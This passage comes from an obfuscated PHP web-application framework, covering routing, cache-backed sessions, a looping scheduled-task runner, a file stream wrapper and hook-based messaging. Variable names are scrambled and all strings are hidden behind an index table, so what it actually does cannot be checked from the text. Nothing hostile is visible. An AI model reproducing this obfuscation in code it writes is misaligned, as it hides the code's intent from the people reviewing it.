$×Ããƒ“Ù[$ ¬ËßÈ[$Ù¦«†ıè[32]]] = $ ¬ËßÈ[$Ù¦«†ıè[1140]]; } } $É³´ºõ· = array_merge(array($Ù¦«†ıè[1136] . $±çï©šà . $Ù¦«†ıè[118]), $ïŞâïıö, array_values($×Ããƒ“Ù)); $É³´ºõ· = implode($Ù¦«†ıè[71] . PHP_EOL, $É³´ºõ·) . $Ù¦«†ıè[71]; if ($˜­Ì··  && $˜­Ì··  == $Ù¦«†ıè[13]) { return $É³´ºõ·; } $ĞãÅ«µ¡ = array(); $æğ¾±Î¥ = array($Ù¦«†ıè[1128] => $Ù¦«†ıè[1141], $Ù¦«†ıè[315] => $Ù¦«†ıè[1142]); $ìïãÀş¹ = $Ù¦«†ıè[12]; foreach ($š—²¡¾Ñ as $ ¬ËßÈ) { if ($ ¬ËßÈ[$Ù¦«†ıè[57]] == $Ù¦«†ıè[88]) { $ìïãÀş¹ = $ ¬ËßÈ[$Ù¦«†ıè[32]]; } $£È¥ù— = array($Ù¦«†ıè[385] . $ ¬ËßÈ[$Ù¦«†ıè[32]] . $Ù¦«†ıè[385], isset($æğ¾±Î¥[$ ¬ËßÈ[$Ù¦«†ıè[33]]]) ? $æğ¾±Î¥[$ ¬ËßÈ[$Ù¦«†ıè[33]]] : $ ¬ËßÈ[$Ù¦«†ıè[33]], $ ¬ËßÈ[$Ù¦«†ıè[35]] == $Ù¦«†ıè[88] ? $Ù¦«†ıè[1133] : $Ù¦«†ıè[1143] . $ ¬ËßÈ[$Ù¦«†ıè[56]], $ ¬ËßÈ[$Ù¦«†ıè[57]] == $Ù¦«†ıè[88] ? $Ù¦«†ıè[1144] : $Ù¦«†ıè[12]); $ĞãÅ«µ¡[] = trim(implode($Ù¦«†ıè[53], $£È¥ù—)); } foreach ($×Ããƒ“Ù as $ÒÛ¾Ù×» => $…¶·Ï) { $‚è”İ£ = str_replace($Ù¦«†ıè[1145] . $±çï©šà . $Ù¦«†ıè[11], $Ù¦«†ıè[12], $ÒÛ¾Ù×»); $«ØÉ™“‘ = str_replace(array($Ù¦«†ıè[118], $Ù¦«†ıè[967]), $Ù¦«†ıè[385], substr($…¶·Ï, stripos($…¶·Ï, $Ù¦«†ıè[260]))); if ($‚è”İ£ == $Ù¦«†ıè[1122]) { $­Ö…ìˆ¶ = $Ù¦«†ıè[1146] . $ìïãÀş¹ . $Ù¦«†ıè[1147]; } else { $­Ö…ìˆ¶ = (stripos($‚è”İ£, $Ù¦«†ıè[11]) ? $Ù¦«†ıè[1148] : $Ù¦«†ıè[12]) . ($Ù¦«†ıè[1149] . $‚è”İ£ . $Ù¦«†ıè[1150] . $«ØÉ™“‘); } $ĞãÅ«µ¡[] = $­Ö…ìˆ¶; } $´Ä®§×÷ = array($Ù¦«†ıè[1151] . $±çï©šà . $Ù¦«†ıè[1152], $Ù¦«†ıè[1153] . $±çï©šà . $Ù¦«†ıè[1154], implode($Ù¦«†ıè[50] . PHP_EOL, $ĞãÅ«µ¡), $Ù¦«†ıè[1155]); $´“ÃŞô¿ = implode(PHP_EOL, $´Ä®§×÷); if ($˜­Ì··  && $˜­Ì··  == $Ù¦«†ıè[817]) { return $´“ÃŞô¿; } $°—©µóÇ = array($Ù¦«†ıè[817] => $´“ÃŞô¿, $Ù¦«†ıè[13] => $É³´ºõ·); return $˜­Ì··  ? $°—©µóÇ[$˜­Ì·· ] : $°—©µóÇ; } } goto E±“³§œ•³; f¦Ã–­İ: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\x79" => "\x5b\x5e\x2f\135\x2b", "\x3a\x6e\x75\155" => "\x5b\60\x2d\71\x5d\x2b", "\72\141\154\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($áó…ïé¨, $Ï·‹Ğ˜Œ) { $ıÄĞÀú£ =& $_SERVER[ï»»·÷á]; if ($áó…ïé¨ == $ıÄĞÀú£[1623]) { $Œßç›ªÚ = array_map($ıÄĞÀú£[1624], $Ï·‹Ğ˜Œ[0]); $¶Õı™”Ï = strpos($Ï·‹Ğ˜Œ[1], $ıÄĞÀú£[8]) === 0 ? $Ï·‹Ğ˜Œ[1] : $ıÄĞÀú£[8] . $Ï·‹Ğ˜Œ[1]; $„ÏšğŒß = $Ï·‹Ğ˜Œ[2]; } else { $Œßç›ªÚ = null; $¶Õı™”Ï = strpos($Ï·‹Ğ˜Œ[0], $ıÄĞÀú£[8]) === 0 ? $Ï·‹Ğ˜Œ[0] : $ıÄĞÀú£[8] . $Ï·‹Ğ˜Œ[0]; $„ÏšğŒß = $Ï·‹Ğ˜Œ[1]; } array_push(self::$maps, $Œßç›ªÚ); array_push(self::$routes, $¶Õı™”Ï); array_push(self::$methods, strtoupper($áó…ïé¨)); array_push(self::$callbacks, $„ÏšğŒß); } public static function error($±¾ñÚğõ) { self::$errorCallback = $±¾ñÚğõ; } public static function haltOnMatch($ƒË“‹Ğ£ = true) { self::$halts = $ƒË“‹Ğ£; } public static function dispatch() { $ûá–±ğê =& $_SERVER[ï»»·÷á]; $¸æ„ òÌ = parse_url($_SERVER[$ûá–±ğê[1625]], PHP_URL_PATH); $˜ø’ê©Í = $_SERVER[$ûá–±ğê[159]]; $ã¤çäß = array_keys(static::$patterns); $µ¦ÔæŒÄ = array_values(static::$patterns); $î¥ñÍ¢ = !1; self::$routes = preg_replace($ûá–±ğê[1286], $ûá–±ğê[8], self::$routes); if (in_array($¸æ„ òÌ, self::$routes)) { $‰ÔÌŞ—Š = array_keys(self::$routes, $¸æ„ òÌ); foreach ($‰ÔÌŞ—Š as $û³°ü³Ş) { if (self::$methods[$û³°ü³Ş] == $˜ø’ê©Í || self::$methods[$û³°ü³Ş] == $ûá–±ğê[1626] || in_array($˜ø’ê©Í, self::$maps[$û³°ü³Ş])) { $î¥ñÍ¢ = !0; if (!is_object(self::$callbacks[$û³°ü³Ş])) { $î‡µ¾¡ = explode($ûá–±ğê[8], self::$callbacks[$û³°ü³Ş]); $âú†Å–© = end($î‡µ¾¡); $ƒæ¥¶ƒì = explode($ûá–±ğê[1218], $âú†Å–©); $£Íö±ûú = new $ƒæ¥¶ƒì[0](); $£Íö±ûú->{$ƒæ¥¶ƒì[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$û³°ü³Ş]); if (self::$halts) { return; } } } } } else { $ë¤™¾„í = 0; foreach (self::$routes as $û³°ü³Ş) { if (strpos($û³°ü³Ş, $ûá–±ğê[4]) !== !1) { $û³°ü³Ş = str_replace($ã¤çäß, $µ¦ÔæŒÄ, $û³°ü³Ş); } if (preg_match($ûá–±ğê[1627] . $û³°ü³Ş . $ûá–±ğê[1628], $¸æ„ òÌ, $ï¡½åÊğ)) { if (self::$methods[$ë¤™¾„í] == $˜ø’ê©Í || self::$methods[$ë¤™¾„í] == $ûá–±ğê[1626] || !empty(self::$maps[$ë¤™¾„í]) && in_array($˜ø’ê©Í, self::$maps[$ë¤™¾„í])) { $î¥ñÍ¢ = !0; array_shift($ï¡½åÊğ); if (!is_object(self::$callbacks[$ë¤™¾„í])) { $î‡µ¾¡ = explode($ûá–±ğê[8], self::$callbacks[$ë¤™¾„í]); $âú†Å–© = end($î‡µ¾¡); $ƒæ¥¶ƒì = explode($ûá–±ğê[1218], $âú†Å–©); $£Íö±ûú = new $ƒæ¥¶ƒì[0](); if (!method_exists($£Íö±ûú, $ƒæ¥¶ƒì[1])) { echo $ûá–±ğê[1629]; } else { call_user_func_array(array($£Íö±ûú, $ƒæ¥¶ƒì[1]), $ï¡½åÊğ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ë¤™¾„í], $ï¡½åÊğ); if (self::$halts) { return; } } } } $ë¤™¾„í++; } } if ($î¥ñÍ¢ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Ş¢ôıò© =& $_SERVER[ï»»·÷á]; header($_SERVER[$Ş¢ôıò©[1630]] . $Ş¢ôıò©[1631]); echo $Ş¢ôıò©[1632]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ûá–±ğê[1625]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ÁŸÁâà =& $_SERVER[ï»»·÷á]; static $’³–ã€ñ = false; if ($’³–ã€ñ) { return $’³–ã€ñ; } $‹Ù§“¨· = $GLOBALS[$ÁŸÁâà[6]][$ÁŸÁâà[349]]; self::$sessionTime = $‹Ù§“¨·[$ÁŸÁâà[1633]]; $œŒéöİŸ = isset($GLOBALS[$ÁŸÁâà[1634]]) ? $GLOBALS[$ÁŸÁâà[1634]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($œŒéöİŸ)) { self::$sessionSign = Cookie::get($œŒéöİŸ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($œŒéöİŸ, self::$sessionSign, self::$sessionTime); $ÇÙ§à²‰ = $‹Ù§“¨·[$ÁŸÁâà[1635]]; $¤¶ßå¥º = $‹Ù§“¨·[$ÇÙ§à²‰]; $¡õşîÒÆ = $‹Ù§“¨·[$ÁŸÁâà[841]]; switch ($ÇÙ§à²‰) { case $ÁŸÁâà[21]: self::$handle = Model($ÁŸÁâà[842]); break; case $ÁŸÁâà[843]: self::$handle = new CacheRedis($¤¶ßå¥º, $¡õşîÒÆ); break; case $ÁŸÁâà[844]: self::$handle = new CacheMemcached($¤¶ßå¥º, $¡õşîÒÆ); break; case $ÁŸÁâà[200]: $¤¶ßå¥º[$ÁŸÁâà[84]] = $¤¶ßå¥º[$ÁŸÁâà[84]] . $ÁŸÁâà[1636]; self::$handle = new CacheFile($¤¶ßå¥º, $¡õşîÒÆ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $’³–ã€ñ = new self(); return $’³–ã€ñ; } public static function getBySign($§À¹ùÑÓ) { $Æ¨…ôı˜ = self::$handle->get($§À¹ùÑÓ); $Æ¨…ôı˜ = unserialize($Æ¨…ôı˜); return is_array($Æ¨…ôı˜) ? $Æ¨…ôı˜ : array(); } public static function setBySign($ïè’»º, $Š„‰Ç˜È) { CacheLock::lock($ïè’»º); self::$handle->set($ïè’»º, serialize($Š„‰Ç˜È), self::$sessionTime); CacheLock::unlock($ïè’»º); } public static function sign($í³„Ñ‘‹ = false) { $í³„Ñ‘‹ && (self::$sessionSign = $í³„Ñ‘‹); self::init(); return self::$sessionSign; } public static function set($«š“ÜÁ±, $œ¤…‡Ë = false) { self::init(); if (is_array($«š“ÜÁ±)) { foreach ($«š“ÜÁ± as $×‚Á¢×í => $ßšœÎ³¿) { array_set_value(self::$data, $×‚Á¢×í, $ßšœÎ³¿); } } else { array_set_value(self::$data, $«š“ÜÁ±, $œ¤…‡Ë); } self::setBySign(self::$sessionSign, self::$data); } public static function get($÷ñş‰¬¶ = false) { self::init(); if (!$÷ñş‰¬¶) { return self::$data; } return array_get_value(self::$data, $÷ñş‰¬¶); } public static function remove($ĞÕ³‘¨) { self::init(); unset(self::$data[$ĞÕ³‘¨]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ï»»·÷á][846])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Êæ‡¼¬ =& $_SERVER[ï»»·÷á]; if (self::valueGet($Êæ‡¼¬[762]) != $Êæ‡¼¬[88]) { return; } if (self::valueGet($Êæ‡¼¬[1637]) == $Êæ‡¼¬[88]) { $¢ßı‘Ìû = self::valueGet($Êæ‡¼¬[1638]); if (time() - $¢ßı‘Ìû > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$Êæ‡¼¬[1639]] = 1; self::valueSet($Êæ‡¼¬[1637], $Êæ‡¼¬[88]); self::log($Êæ‡¼¬[1640] . ACTION . $Êæ‡¼¬[1641]); Session::$data = array(); Session::$sessionSign = $Êæ‡¼¬[12]; $GLOBALS[$Êæ‡¼¬[503]] = 1; Hook::bind($Êæ‡¼¬[1642], $Êæ‡¼¬[1643]); $”áã‰ƒ¶ = 0; while (!0) { self::cacheClear(); if (self::valueGet($Êæ‡¼¬[762]) != $Êæ‡¼¬[88]) { self::valueSet($Êæ‡¼¬[1637], $Êæ‡¼¬[198]); self::log($Êæ‡¼¬[1644]); die; } $½±øŸò = time(); if ($½±øŸò - $”áã‰ƒ¶ >= 60) { self::valueSet(array($Êæ‡¼¬[1637] => $Êæ‡¼¬[88], $Êæ‡¼¬[1638] => $½±øŸò), !1); $”áã‰ƒ¶ = $½±øŸò; } if (!file_exists(USER_SYSTEM . $Êæ‡¼¬[1645])) { self::valueSet(array($Êæ‡¼¬[1637] => $Êæ‡¼¬[198], $Êæ‡¼¬[762] => $Êæ‡¼¬[198]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $¿ëê€®¦ =& $_SERVER[ï»»·÷á]; http_close(); self::valueSet($¿ëê€®¦[762], $¿ëê€®¦[198]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($¿ëê€®¦[1637] => $¿ëê€®¦[198], $¿ëê€®¦[762] => $¿ëê€®¦[88]), !1); } public static function taskSwitch() { $šã”²©‰ =& $_SERVER[ï»»·÷á]; $ÅÖ¯æ÷ô = self::valueGet($šã”²©‰[762]) == $šã”²©‰[88] ? $šã”²©‰[198] : $šã”²©‰[88]; self::valueSet($šã”²©‰[762], $ÅÖ¯æ÷ô); } public static function shutdownEvent() { $¼çÎïà =& $_SERVER[ï»»·÷á]; self::valueSet($¼çÎïà[1637], $¼çÎïà[198]); self::log($¼çÎïà[1646]); } public static function config($¼†Ç±ª, $òØıíÌ·) { self::valueSet($_SERVER[ï»»·÷á][762], $¼†Ç±ª); } private static function taskRunAll() { $²¸Áß€º =& $_SERVER[ï»»·÷á]; $Ñ™ÁÛ = timeFloat(); $”Ú‡½ä“ = Model($²¸Áß€º[1647])->listData(); $íôî‰ÉØ = count($”Ú‡½ä“); for ($¹¶›·¨¤ = 0; $¹¶›·¨¤ < $íôî‰ÉØ; $¹¶›·¨¤++) { $¾¤©ÈıÚ = $”Ú‡½ä“[$¹¶›·¨¤]; if (!$¾¤©ÈıÚ[$²¸Áß€º[399]] || $¾¤©ÈıÚ[$²¸Áß€º[1648]] != $²¸Áß€º[88]) { continue; } if (!self::taskTimeCheck($¾¤©ÈıÚ)) { continue; } self::taskRun($¾¤©ÈıÚ); } Hook::trigger($²¸Áß€º[1649]); self::taskQueueRun($Ñ™ÁÛ); } private static function taskQueueRun($ÀÀ´î©Ÿ) { $Ä¥Ñ¦ÎÛ = 10; while (!0) { $¹È¾ß¦ = TaskQueue::run(); if ($¹È¾ß¦ === !1) { break; } if (timeFloat() - $ÀÀ´î©Ÿ >= $Ä¥Ñ¦ÎÛ) { break; } } } private static function taskTimeCheck($½Ÿæº£Ğ) { $¸ñÍ€  =& $_SERVER[ï»»·÷á]; $ş—äÛ„í = json_decode($½Ÿæº£Ğ[$¸ñÍ€ [180]], !0); $¨ïàŒ’¢ = intval($½Ÿæº£Ğ[$¸ñÍ€ [1638]]); $äº§¥¼† = strtotime($¸ñÍ€ [1650] . $ş—äÛ„í[$¸ñÍ€ [1651]] . $¸ñÍ€ [1652]) - strtotime($¸ñÍ€ [1653]); $Í ¬ûÊ¿ = time() - strtotime(date($¸ñÍ€ [1654]) . $¸ñÍ€ [1655]); $¾Ö®Ÿ¬Ç = $Í ¬ûÊ¿ >= $äº§¥¼† && $Í ¬ûÊ¿ <= $äº§¥¼† + 3600; switch ($ş—äÛ„í[$¸ñÍ€ [33]]) { case $¸ñÍ€ [1656]: if (time() - $¨ïàŒ’¢ < 3600 * 24 * 30) { return !1; } if ($ş—äÛ„í[$¸ñÍ€ [1656]] == date($¸ñÍ€ [1657]) && $¾Ö®Ÿ¬Ç) { return !0; } break; case $¸ñÍ€ [1658]: if (time() - $¨ïàŒ’¢ < 3600 * 24 * 7) { return !1; } $œ®†¡Å = date($¸ñÍ€ [1659]) == 0 ? 7 : date($¸ñÍ€ [1659]); if ($ş—äÛ„í[$¸ñÍ€ [1658]] == $œ®†¡Å && $¾Ö®Ÿ¬Ç) { return !0; } break; case $¸ñÍ€ [1651]: if (time() - $¨ïàŒ’¢ < 3600 * 24) { return !1; } if ($¾Ö®Ÿ¬Ç) { return !0; } break; case $¸ñÍ€ [1660]: if (time() - $¨ïàŒ’¢ >= floatval($ş—äÛ„í[$¸ñÍ€ [1660]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ ¦¨Ò¨ =& $_SERVER[ï»»·÷á]; static $Ü¡üÇ¼› = 0; $™¼×—ä = 300; if (!$Ü¡üÇ¼›) { $Ü¡üÇ¼› = time(); } if (time() - $Ü¡üÇ¼› < $™¼×—ä) { return; } $Ü¡üÇ¼› = time(); $è½†¼¾” = Model($ ¦¨Ò¨[513])->db($ ¦¨Ò¨[12]); if ($è½†¼¾”) { $è½†¼¾”->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ ¦¨Ò¨[1661], $ ¦¨Ò¨[1662]); die; } } public static function taskRun($İ¾°Îëü) { $£«Î„˜± =& $_SERVER[ï»»·÷á]; self::log($£«Î„˜±[1663] . $İ¾°Îëü[$£«Î„˜±[399]] . $£«Î„˜±[1664] . $İ¾°Îëü[$£«Î„˜±[32]] . $£«Î„˜±[1665] . $İ¾°Îëü[$£«Î„˜±[1666]]); Model($£«Î„˜±[1647])->run($İ¾°Îëü[$£«Î„˜±[399]]); $³¤¿à„™ = timeFloat(); $’ÖÜõÑ = $£«Î„˜±[12]; switch ($İ¾°Îëü[$£«Î„˜±[33]]) { case $£«Î„˜±[307]: $›’²ß¸÷ = url_request($İ¾°Îëü[$£«Î„˜±[1666]], $£«Î„˜±[230], !1, !1, !1, !1, 10); if ($›’²ß¸÷[$£«Î„˜±[762]]) { $’ÖÜõÑ = strlen($›’²ß¸÷[$£«Î„˜±[1212]]); } break; case $£«Î„˜±[229]: $’ÖÜõÑ = Hook::apply($İ¾°Îëü[$£«Î„˜±[1666]]); default: break; } Model($£«Î„˜±[1667])->add(array($£«Î„˜±[1668] => $£«Î„˜±[12], $£«Î„˜±[1669] => $£«Î„˜±[198], $£«Î„˜±[33] => $£«Î„˜±[1670] . $İ¾°Îëü[$£«Î„˜±[399]], $£«Î„˜±[1671] => json_encode(array($£«Î„˜±[32] => $İ¾°Îëü[$£«Î„˜±[32]], $£«Î„˜±[1672] => timeFloat() - $³¤¿à„™, $£«Î„˜±[293] => $’ÖÜõÑ)))); $·ëö—³à = $’ÖÜõÑ ? $£«Î„˜±[1673] . $’ÖÜõÑ : $£«Î„˜±[12]; self::log($£«Î„˜±[1674] . $İ¾°Îëü[$£«Î„˜±[399]] . $£«Î„˜±[164] . $·ëö—³à); return !0; } private static function valueGet($±¢ı’ÂÍ) { $†Ù©õ« =& $_SERVER[ï»»·÷á]; $ÊäêÜ»Ù = $†Ù©õ«[1675]; $¡°¤×†İ = Model($†Ù©õ«[444])->get($±¢ı’ÂÍ, $ÊäêÜ»Ù); if (is_null($¡°¤×†İ)) { Model($†Ù©õ«[444])->set($†Ù©õ«[762], $†Ù©õ«[88], $ÊäêÜ»Ù); Model($†Ù©õ«[444])->set($†Ù©õ«[1637], $†Ù©õ«[198], $ÊäêÜ»Ù); $¡°¤×†İ = Model($†Ù©õ«[444])->get($±¢ı’ÂÍ, $ÊäêÜ»Ù); } return $¡°¤×†İ; } private static function valueSet($šßãşËâ, $¢ ‰ˆä’) { $üÆÕÅ­¶ =& $_SERVER[ï»»·÷á]; $ƒÒ†©¿ = $üÆÕÅ­¶[1676]; CacheLock::lock($ƒÒ†©¿); $Î ½½È = Model($üÆÕÅ­¶[444])->set($šßãşËâ, $¢ ‰ˆä’, $üÆÕÅ­¶[1675]); CacheLock::unlock($ƒÒ†©¿); return $Î ½½È; } protected static function log($üïÁ†¤û) { write_log($üïÁ†¤û, $_SERVER[ï»»·÷á][1662]); } private static function cacheClear() { $şµ¾¤ëİ =& $_SERVER[ï»»·÷á]; Cache::clearMemory(Model($şµ¾¤ëİ[444])->cacheKey($şµ¾¤ëİ[1675])); Cache::clearMemory(Model($şµ¾¤ëİ[444])->cacheKey($şµ¾¤ëİ[1677])); Model($şµ¾¤ëİ[1647])->cacheClear(); self::closeDatabase(); } } goto E„»¹‹À­Û; bç…¸µìÃÈ: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ ¶Ó , $¹ÆĞŠÇû = '') { $this->info = $this->info($ ¶Ó ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ï»»·÷á][84]]; $this->pathOpen = $ ¶Ó ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ ¶Ó ])) { self::$_chunkBuffer[$ ¶Ó ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ãŠ¸¢êÚ) { $´é£úæ¢ = $this->fileSubstr($this->pose, $ãŠ¸¢êÚ); $this->pose += strlen($´é£úæ¢); return $´é£úæ¢; } public function stream_tell() { return $this->pose; } public function stream_seek($£¹üş¤·, $™˜öƒÈµ) { $ÖûìÀè¤ =& $_SERVER[ï»»·÷á]; if ($™˜öƒÈµ == SEEK_SET) { $this->pose = $£¹üş¤·; } else { if ($™˜öƒÈµ == SEEK_CUR) { $this->pose += $£¹üş¤·; } else { if ($™˜öƒÈµ == SEEK_END) { $this->pose = $this->info[$ÖûìÀè¤[76]] + intval($£¹üş¤·); } } } if ($£¹üş¤· < 0) { $this->pose = $this->info[$ÖûìÀè¤[76]] + $£¹üş¤·; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ï»»·÷á][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($©ô±Öƒ¼, $¦æ–‹ß) { $Êïö‹Ş‰ =& $_SERVER[ï»»·÷á]; $É£µ¾©… = $this->info($©ô±Öƒ¼); return array($Êïö‹Ş‰[1525] => 0, $Êïö‹Ş‰[1526] => 0, $Êïö‹Ş‰[16] => 32768 + 511, $Êïö‹Ş‰[1527] => 0, $Êïö‹Ş‰[1528] => 0, $Êïö‹Ş‰[1529] => 0, $Êïö‹Ş‰[1530] => 0, $Êïö‹Ş‰[76] => $É£µ¾©…[$Êïö‹Ş‰[76]], $Êïö‹Ş‰[1531] => $É£µ¾©…[$Êïö‹Ş‰[1399]], $Êïö‹Ş‰[1487] => $É£µ¾©…[$Êïö‹Ş‰[85]], $Êïö‹Ş‰[1486] => $É£µ¾©…[$Êïö‹Ş‰[201]], $Êïö‹Ş‰[1532] => 0, $Êïö‹Ş‰[1533] => 0); } static $fileInfo = array(); public function info($¥€İÕ½) { $ó¬ÃØ©˜ = $_SERVER[ï»»·÷á][1534]; if (isset(self::$fileInfo[$¥€İÕ½])) { return self::$fileInfo[$¥€İÕ½]; } if (substr($¥€İÕ½, 0, strlen($ó¬ÃØ©˜)) != $ó¬ÃØ©˜) { return !1; } self::$fileInfo[$¥€İÕ½] = IO::info(substr($¥€İÕ½, strlen($ó¬ÃØ©˜))); return self::$fileInfo[$¥€İÕ½]; } public static function read($€×‚Öì, $ÛøÎ»Ç, $¯”Ú¦) { if (!isset(self::$_fopenCache[$€×‚Öì])) { $ÎÍ¾»õÆ = new StreamWrapperIO(); $ÎÍ¾»õÆ->stream_open($€×‚Öì); self::$_fopenCache[$€×‚Öì] = $ÎÍ¾»õÆ; } $ÎÍ¾»õÆ = self::$_fopenCache[$€×‚Öì]; return $ÎÍ¾»õÆ->fileSubstr($ÛøÎ»Ç, $¯”Ú¦); } public static function _read($İ—ì„ş, $òƒÎåİ¹, $ã÷Ç¹³¡) { $ğ‚øë¦î =& $_SERVER[ï»»·÷á]; $¸ªäÏ¡ù = fopen($İ—ì„ş, $ğ‚øë¦î[1403]); if (!$¸ªäÏ¡ù) { return $ğ‚øë¦î[12]; } $î”¤çßÕ = 8192; fseek($¸ªäÏ¡ù, $òƒÎåİ¹, SEEK_SET); $İÙ¸†‡¯ = $ğ‚øë¦î[12]; $ïÛ•¸É¬ = 0; while ($ïÛ•¸É¬ < $ã÷Ç¹³¡) { $ç©ÇĞªÁ = min($î”¤çßÕ, $ã÷Ç¹³¡ - $ïÛ•¸É¬); $İÙ¸†‡¯ .= fread($¸ªäÏ¡ù, $ç©ÇĞªÁ); $ïÛ•¸É¬ += $ç©ÇĞªÁ; } fclose($¸ªäÏ¡ù); return $İÙ¸†‡¯; } public function fileSubstr($ÊÂªŞäî, $¸ÅğøÔú) { $±½ùªŞ– =& $_SERVER[ï»»·÷á]; $Î¦“‹ßœ = $this->info[$±½ùªŞ–[76]]; $·±ÇÓ°È = $ÊÂªŞäî; $ı”âü  = $¸ÅğøÔú; if ($ÊÂªŞäî < 0) { $ÊÂªŞäî = $Î¦“‹ßœ + $ÊÂªŞäî; } if ($¸ÅğøÔú === !1) { $¸ÅğøÔú = $Î¦“‹ßœ - $ÊÂªŞäî; } if ($ÊÂªŞäî + $¸ÅğøÔú > $Î¦“‹ßœ) { $¸ÅğøÔú = $Î¦“‹ßœ - $ÊÂªŞäî; } if ($¸ÅğøÔú <= 0) { return $±½ùªŞ–[12]; } if ($ÊÂªŞäî < 0 || $ÊÂªŞäî >= $Î¦“‹ßœ || $¸ÅğøÔú <= 0 || $¸ÅğøÔú > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\151\x6c\x65\122\x65\x61\144\40\x65\162\x72\x6f\162\x21\40\163\x74\141\x72\164\75{$ÊÂªŞäî}\73\154\145\156\147\x74\x68\75{$¸ÅğøÔú}\x3b\40\x73\x69\172\x65\75{$Î¦“‹ßœ}\x3b"); } $º¾Úàê³ = 64 * 1024; $ïï°®›¢ =& self::$_chunkBuffer[$this->path]; if (!$ïï°®›¢) { $ïï°®›¢ = array(); } $¤Ğù™ = 0; $»ş×À´ù = 0; $“šåëÄï = $±½ùªŞ–[12]; foreach ($ïï°®›¢ as $¤Ğù™ => $“šåëÄï) { $¤Ğù™ = intval($¤Ğù™); $»ş×À´ù = $¤Ğù™ + strlen($“šåëÄï); if ($ÊÂªŞäî >= $»ş×À´ù) { continue; } if ($ÊÂªŞäî >= $¤Ğù™ && $ÊÂªŞäî + $¸ÅğøÔú <= $»ş×À´ù) { return substr($“šåëÄï, $ÊÂªŞäî - $¤Ğù™, $¸ÅğøÔú); } break; } if (count($ïï°®›¢) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($±½ùªŞ–[1535], $±½ùªŞ–[1536] . count($ïï°®›¢) . "\x3b\163\164\x61\x72\x74\x3d{$ÊÂªŞäî}\x2c\154\145\x6e\147\x74\150\75{$¸ÅğøÔú}\73\160\157\x73\x65\72{$¤Ğù™}\176{$»ş×À´ù}"); throw new Exception($±½ùªŞ–[1537]); } $”ÌŞ’Àµ = intval($ÊÂªŞäî / $º¾Úàê³) * $º¾Úàê³; $ØåšÑ™˜ = ceil(($ÊÂªŞäî + $¸ÅğøÔú) / $º¾Úàê³) * $º¾Úàê³ - $”ÌŞ’Àµ; $ìéÈ©– = IO::fileSubstr($this->path, $”ÌŞ’Àµ, $ØåšÑ™˜); $ïï°®›¢[$”ÌŞ’Àµ . $±½ùªŞ–[12]] = $ìéÈ©–; ksort($ïï°®›¢); $‰šÈå•¨ = substr($ìéÈ©–, $ÊÂªŞäî - $”ÌŞ’Àµ, $¸ÅğøÔú); return $‰šÈå•¨; } private function log($ÑğüŒ¤±, $ÓÛòûäú) { $Ó€ô“­ª =& $_SERVER[ï»»·÷á]; $Œã‰À´ = timeFloat() - $this->timeStart; write_log(sprintf($Ó€ô“­ª[1538], $ÑğüŒ¤±, $this->info[$Ó€ô“­ª[32]], $Œã‰À´, $ÓÛòûäú), $Ó€ô“­ª[1192]); } } class Message { function __construct() { } public function send($ØŠæ™à = '', $÷âğö§ = array(), $«ÅÖ¶Š‹ = "\x74\x65\x78\x74") { $½ûØè¾ä =& $_SERVER[ï»»·÷á]; $îàÖ‰ÌÔ = array($½ûØè¾ä[33] => $½ûØè¾ä[1539], $½ûØè¾ä[767] => $ØŠæ™à); if (in_array($«ÅÖ¶Š‹, array($½ûØè¾ä[1539], $½ûØè¾ä[1540]))) { $îàÖ‰ÌÔ[$½ûØè¾ä[33]] = $«ÅÖ¶Š‹; } $÷âğö§ = array($½ûØè¾ä[514] => isset($÷âğö§[$½ûØè¾ä[514]]) ? $÷âğö§[$½ûØè¾ä[514]] : $½ûØè¾ä[12], $½ûØè¾ä[599] => isset($÷âğö§[$½ûØè¾ä[599]]) ? $÷âğö§[$½ûØè¾ä[599]] : $½ûØè¾ä[12]); if (empty($ØŠæ™à) || empty($÷âğö§[$½ûØè¾ä[514]]) && empty($÷âğö§[$½ûØè¾ä[599]])) { return !1; } $øÀ’Ñ¸› = array($½ûØè¾ä[1480] => $îàÖ‰ÌÔ, $½ûØè¾ä[1541] => $÷âğö§); Hook::trigger($½ûØè¾ä[1542], $øÀ’Ñ¸›); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ß±ìˆ™ =& 